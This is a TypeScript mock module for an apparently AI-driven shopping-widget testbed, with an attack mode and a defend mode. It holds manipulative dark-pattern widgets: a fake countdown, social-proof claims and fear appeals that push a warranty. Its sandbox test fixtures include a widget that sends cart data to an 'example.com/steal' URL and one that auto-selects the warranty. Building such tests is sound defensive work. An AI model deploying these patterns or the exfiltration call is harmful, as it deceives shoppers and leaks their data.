// mock モード: 保存済みのレスポンスを、観測入力に応じて単純なルールで選ぶ。
// ライブ生成したと見せかけないよう、レスポンスには source: 'mock' が付き、画面でも明示する。
// 生成コードは live と同じ検証・トランスパイル・sandbox を通る。
import type { ObservationInput, UiDecision } from '../schema';

export type MockScenario = 'default' | 'broken' | 'runtime_error' | 'slow' | 'auto_option' | 'infinite_loop';

const PRICE_LIMITED = `import React, { useState, useEffect } from 'react';

export default function GeneratedWidget({ context, emit }) {
  const [seconds, setSeconds] = useState(599);
  useEffect(() => {
    const t = setTimeout(() => setSeconds((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearTimeout(t);
  }, [seconds]);
  const mm = String(Math.floor(seconds / 60)).padStart(2, '0');
  const ss = String(seconds % 60).padStart(2, '0');
  return (
    <div className="root">
      <span className="badge">人気上昇中</span>
      <span className="text">いま多くの方がこの商品を見ています。表示中の価格 ¥{context.product ? context.product.priceYen.toLocaleString('ja-JP') : ''}</span>
      <span className="timer" data-action-id="timer">{mm}:{ss}</span>
      <button className="x" data-action-id="price-limited-close" onClick={() => emit({ kind: 'dismiss' })}>×</button>
    </div>
  );
}
`;

const PRICE_LIMITED_CSS = `.root{display:flex;align-items:center;gap:8px;padding:8px 10px;border-radius:8px;background:#fff4e5;border:1px solid #f0a020;font-size:13px;color:#7a3e00}
.badge{background:#d9480f;color:#fff;border-radius:4px;padding:2px 6px;font-weight:700;font-size:12px}
.text{flex:1}.timer{font-family:monospace;font-weight:700;color:#c92a2a}
.x{border:none;background:transparent;font-size:16px;cursor:pointer;color:#7a3e00}`;

const WARRANTY_NUDGE = `import React from 'react';

export default function GeneratedWidget({ context, emit }) {
  const opt = context.options.find((o) => o.id === 'warranty');
  if (!opt) return null;
  return (
    <div className="root">
      <div className="head">🛡️ <b>ほとんどの方が選んでいます</b></div>
      <label className="row">
        <input
          type="checkbox"
          data-action-id="warranty-toggle"
          checked={opt.selected}
          onChange={(e) => emit({ kind: 'set_option', optionId: 'warranty', selected: e.target.checked })}
        />
        <span>{opt.label}で故障の不安なし（+¥{opt.priceYen.toLocaleString('ja-JP')}）</span>
      </label>
      <div className="note">修理代は平均で数万円かかることも。</div>
    </div>
  );
}
`;

const WARRANTY_NUDGE_CSS = `.root{padding:10px 12px;border-radius:8px;background:linear-gradient(90deg,#e7f5ff,#fff);border:2px solid #1c7ed6;font-size:13px}
.head{margin-bottom:6px;color:#1864ab}.row{display:flex;gap:8px;align-items:center;font-weight:700;cursor:pointer}
.note{margin-top:4px;color:#555;font-size:12px}`;

const CART_COMPARE = `import React from 'react';

export default function GeneratedWidget({ context, emit }) {
  const opt = context.options.find((o) => o.id === 'warranty');
  if (!opt) return null;
  const withWarranty = context.cart.totalYen + (opt.selected ? 0 : opt.priceYen);
  return (
    <div className="root">
      <div className="title">あと少しで「安心プラン」</div>
      <div className="cols">
        <div className={'col' + (opt.selected ? '' : ' dim')}>
          <div>保証なし</div>
          <div className="small">故障時は自己負担</div>
        </div>
        <div className={'col rec' + (opt.selected ? ' on' : '')}>
          <div>おすすめ ✓ 3年保証</div>
          <div className="price">合計 ¥{withWarranty.toLocaleString('ja-JP')}</div>
          <button data-action-id="cart-compare-add" disabled={opt.selected} onClick={() => emit({ kind: 'set_option', optionId: 'warranty', selected: true })}>
            {opt.selected ? '追加済み' : '保証を追加する'}
          </button>
        </div>
      </div>
    </div>
  );
}
`;

const CART_COMPARE_CSS = `.root{padding:10px;border:1px solid #ddd;border-radius:8px;background:#fff;font-size:13px}
.title{font-weight:700;margin-bottom:6px}.cols{display:flex;gap:8px}.col{flex:1;padding:8px;border-radius:6px;background:#f6f6f6}
.dim{opacity:.6}.rec{background:#fff9db;border:2px solid #f59f00}.on{background:#ebfbee;border-color:#2f9e44}
.small{font-size:11px;color:#666}.price{font-weight:700;margin:4px 0}
button{background:#f59f00;border:none;border-radius:16px;padding:6px 10px;font-weight:700;cursor:pointer}
button:disabled{background:#ccc;cursor:default}`;

const SAFE_WARRANTY = `import React from 'react';

export default function GeneratedWidget({ context, emit }) {
  const opt = context.options.find((o) => o.id === 'warranty');
  if (!opt) return null;
  const base = context.product ? context.product.priceYen : 0;
  return (
    <div className="root">
      <div className="head">追加オプション（任意）</div>
      <div>{opt.label}: +¥{opt.priceYen.toLocaleString('ja-JP')}（税込）。{opt.description}</div>
      <div className="sum">保証なし ¥{base.toLocaleString('ja-JP')} / 保証あり ¥{(base + opt.priceYen).toLocaleString('ja-JP')}（予算 ¥{context.budgetYen.toLocaleString('ja-JP')}）</div>
      <div className="btns">
        <button data-action-id="safe-no" className={opt.selected ? '' : 'sel'} onClick={() => emit({ kind: 'set_option', optionId: 'warranty', selected: false })}>付けない</button>
        <button data-action-id="safe-yes" className={opt.selected ? 'sel' : ''} onClick={() => emit({ kind: 'set_option', optionId: 'warranty', selected: true })}>付ける</button>
      </div>
    </div>
  );
}
`;

const SAFE_WARRANTY_CSS = `.root{padding:10px 12px;border:1px solid #adb5bd;border-radius:8px;background:#fff;font-size:13px;color:#212529}
.head{font-weight:700;margin-bottom:4px}.sum{margin:6px 0;color:#495057}.btns{display:flex;gap:8px}
button{flex:1;padding:6px;border:1px solid #868e96;background:#fff;border-radius:6px;cursor:pointer}
.sel{border:2px solid #212529;font-weight:700}`;

const SAFE_INFO = `import React from 'react';

export default function GeneratedWidget({ context, emit }) {
  return (
    <div className="root">
      <span>表示価格 ¥{context.product ? context.product.priceYen.toLocaleString('ja-JP') : ''}（税込）・{context.product ? context.product.shippingNote : ''}。期間限定ではありません。</span>
      <button data-action-id="safe-info-close" onClick={() => emit({ kind: 'dismiss' })}>閉じる</button>
    </div>
  );
}
`;

const SAFE_INFO_CSS = `.root{display:flex;gap:8px;align-items:center;padding:8px 10px;border:1px solid #adb5bd;border-radius:8px;background:#f8f9fa;font-size:13px}
span{flex:1}button{border:1px solid #868e96;background:#fff;border-radius:6px;cursor:pointer}`;

const SAFE_CART = `import React from 'react';

export default function GeneratedWidget({ context, emit }) {
  const opt = context.options.find((o) => o.id === 'warranty');
  return (
    <div className="root">
      <div>現在の合計: <b>¥{context.cart.totalYen.toLocaleString('ja-JP')}</b>（予算 ¥{context.budgetYen.toLocaleString('ja-JP')}）</div>
      {opt ? <div>{opt.label}は任意です（+¥{opt.priceYen.toLocaleString('ja-JP')}）。{opt.selected ? '現在: 追加あり' : '現在: 追加なし'}</div> : null}
      {opt && opt.selected ? <button data-action-id="safe-cart-remove" onClick={() => emit({ kind: 'set_option', optionId: 'warranty', selected: false })}>保証を外す</button> : null}
    </div>
  );
}
`;

const SAFE_CART_CSS = `.root{padding:10px;border:1px solid #adb5bd;border-radius:8px;background:#fff;font-size:13px;display:flex;flex-direction:column;gap:4px}
button{align-self:flex-start;border:1px solid #868e96;background:#fff;border-radius:6px;cursor:pointer;padding:4px 8px}`;

const BROKEN = `export default function GeneratedWidget({ context }) {
  fetch('https://example.com/steal?d=' + context.cart.totalYen);
  return <div>broken</div>;
}
`;

// クリックなしで保証をオンにしようとする（ブロックされることの確認用）
const AUTO_OPTION = `import React, { useEffect, useRef } from 'react';
export default function GeneratedWidget({ context, emit }) {
  const box = useRef(null);
  useEffect(() => {
    emit({ kind: 'set_option', optionId: 'warranty', selected: true });
    const t = setTimeout(() => { if (box.current) box.current.click(); }, 300);
    return () => clearTimeout(t);
  }, []);
  return (
    <label style={{ display: 'block', padding: 8, background: '#fff9db' }}>
      <input ref={box} type="checkbox" data-action-id="auto" checked={!!(context.options[0] && context.options[0].selected)} onChange={(e) => emit({ kind: 'set_option', optionId: 'warranty', selected: e.target.checked })} />
      人気の組み合わせ（自動で保証を追加しようとする検証用）
    </label>
  );
}
`;

const INFINITE_LOOP = `import React from 'react';
export default function GeneratedWidget({ context }) {
  let n = 0;
  while (true) { n++; }
  return <div>{n}</div>;
}
`;

const RUNTIME_ERROR = `import React from 'react';
export default function GeneratedWidget({ context }) {
  const x = context.notExisting.value;
  return <div>{x}</div>;
}
`;

type Ctx = { input: ObservationInput; scenario: MockScenario };

function base(input: ObservationInput, summary: string, explanation: string, hyps: UiDecision['hypotheses']) {
  return {
    requestId: input.requestId,
    basedOnStateRevision: input.stateRevision,
    basedOnUiRevision: input.uiRevision,
    observationSummary: summary,
    hypotheses: hyps,
    explanation,
  };
}

const newEvent = (input: ObservationInput, type: string) => input.recentEvents.filter((e) => e.isNew && e.type === type);

export function mockDecide({ input, scenario }: Ctx): UiDecision {
  const widgets = input.currentUI.widgets;
  const slots = input.currentUI.availableSlots.map((s) => s.slot);
  const has = (id: string) => widgets.some((w) => w.id === id);
  const triedBefore = (id: string) => input.recentInterventions.some((i) => i.widgetId === id);

  if (scenario === 'broken' || scenario === 'runtime_error' || scenario === 'auto_option' || scenario === 'infinite_loop') {
    if (slots.includes('near_price') && !has('broken-demo') && !triedBefore('broken-demo') && !input.repair) {
      const src = { broken: BROKEN, runtime_error: RUNTIME_ERROR, auto_option: AUTO_OPTION, infinite_loop: INFINITE_LOOP }[scenario];
      return {
        ...base(input, '失敗系の確認用レスポンス', `mock: 失敗系（${scenario}）の確認用コードを返します。`, []),
        action: 'upsert_widget',
        tactic: 'failure-test',
        widget: { id: 'broken-demo', slot: 'near_price', sourceTsx: src },
      };
    }
    return { ...base(input, '検証用', 'mock: 検証用シナリオのため変更しません。', []), action: 'noop' };
  }

  if (input.repair) {
    return { ...base(input, '直前の生成が失敗', 'mock: 修正版は用意していないため変更しません。', []), action: 'noop' };
  }

  if (input.mode === 'defend') {
    const target = [...widgets].reverse().find((w) => w.mountedOnPage) ?? widgets[widgets.length - 1];
    if (!target) return { ...base(input, '表示中のウィジェットなし', '改善対象のウィジェットがありません。', []), action: 'noop' };
    if (target.version >= 2 && target.tactic.startsWith('safe')) {
      return { ...base(input, '改善済み', 'すでに安全な表示に置き換え済みです。', []), action: 'noop' };
    }
    const safe =
      target.id === 'price-limited'
        ? { src: SAFE_INFO, css: SAFE_INFO_CSS, tactic: 'safe: 限定表現をやめ価格条件を明記' }
        : target.id === 'cart-compare'
          ? { src: SAFE_CART, css: SAFE_CART_CSS, tactic: 'safe: 合計と予算を並記し外しやすく' }
          : { src: SAFE_WARRANTY, css: SAFE_WARRANTY_CSS, tactic: 'safe: 既定オフ・料金明記・同じ大きさの選択肢' };
    return {
      ...base(input, `${target.id} を改善対象に選択`, `「${target.tactic}」を、料金と条件を明記し断りやすい表示に置き換えます。`, [
        { text: '現在の表示は選択を一方へ寄せる可能性がある', evidenceRefs: [`widget:${target.id}`], certainty: 'medium' },
      ]),
      action: 'upsert_widget',
      tactic: safe.tactic,
      widget: { id: target.id, slot: target.slot, sourceTsx: safe.src, css: safe.css },
    };
  }

  // ---- challenge ----
  const dismissed = newEvent(input, 'widget_dismiss');
  // 閉じられた直後の同じページでは追加しない（ページが変わった場合は別の判断）
  if (dismissed.length > 0 && input.pageId === 'product') {
    return {
      ...base(input, 'ウィジェットが閉じられた', '閉じる操作があったため、しばらく追加の表示はしません。', [
        { text: 'この表示は不要と判断された可能性がある', evidenceRefs: dismissed.map((d) => d.id), certainty: 'medium' },
      ]),
      action: 'noop',
    };
  }

  const region = (id: string) => input.regions.find((r) => r.id === id);
  const price = region('price');
  const purchase = region('purchase');

  if (input.pageId === 'cart' && slots.includes('cart_summary') && !has('cart-compare') && !triedBefore('cart-compare')) {
    const hasTarget = input.scenario.cart.lines.some((l) => l.productId === input.scenario.product.id);
    if (hasTarget) {
      return {
        ...base(input, 'カートに対象商品があり、合計付近が表示されている', 'カート合計の近くに、保証あり/なしの比較パネルを出します。', [
          { text: '購入直前で合計金額を確認している可能性がある', evidenceRefs: ['scenario.cart', 'region:cart_summary'], certainty: 'low' },
        ]),
        action: 'upsert_widget',
        tactic: '比較パネルで保証ありを推奨（デフォルト強調）',
        widget: { id: 'cart-compare', slot: 'cart_summary', sourceTsx: CART_COMPARE, css: CART_COMPARE_CSS },
      };
    }
  }

  if (input.pageId === 'product') {
    const added = newEvent(input, 'cart_add');
    const purchaseDwell = (purchase?.cursorDwellMs ?? 0) + (purchase?.clickCount ?? 0) * 1000;
    if (!has('warranty-nudge') && !triedBefore('warranty-nudge') && (added.length > 0 || purchaseDwell >= 1500)) {
      return {
        ...base(input, added.length > 0 ? 'カート追加の操作があった' : '購入欄の上にカーソルがあった', '購入欄の近くに、延長保証を勧めるトグルを出します。', [
          {
            text: '購入の意思決定に近い段階にいる可能性がある',
            evidenceRefs: added.length > 0 ? added.map((a) => a.id) : ['region:purchase.cursorDwellMs'],
            certainty: 'low',
          },
        ]),
        action: 'upsert_widget',
        tactic: '社会的証明＋不安訴求で追加保証を推奨',
        widget: { id: 'warranty-nudge', slot: 'near_purchase', sourceTsx: WARRANTY_NUDGE, css: WARRANTY_NUDGE_CSS },
      };
    }
    const priceDwell = price?.cumulative.cursorDwellMs ?? 0;
    const priceVisible = price?.cumulative.visibleMs ?? 0;
    if (!has('price-limited') && !triedBefore('price-limited') && (priceDwell >= 1200 || priceVisible >= 4000)) {
      return {
        ...base(
          input,
          priceDwell >= 1200 ? `価格エリアにカーソルが累計${(priceDwell / 1000).toFixed(1)}秒あった` : `価格エリアが累計${(priceVisible / 1000).toFixed(1)}秒表示されていた`,
          '価格の近くに、限定感を演出するバナーを出します。',
          [
            {
              text: '価格を気にしている可能性がある',
              evidenceRefs: [priceDwell >= 1200 ? 'region:price.cursorDwellMs' : 'region:price.visibleMs'],
              certainty: 'low',
            },
          ],
        ),
        action: 'upsert_widget',
        tactic: '限定感・社会的証明の演出',
        widget: { id: 'price-limited', slot: 'near_price', sourceTsx: PRICE_LIMITED, css: PRICE_LIMITED_CSS },
      };
    }
  }

  return { ...base(input, '大きな変化なし', '根拠が弱いため変更しません。', []), action: 'noop' };
}
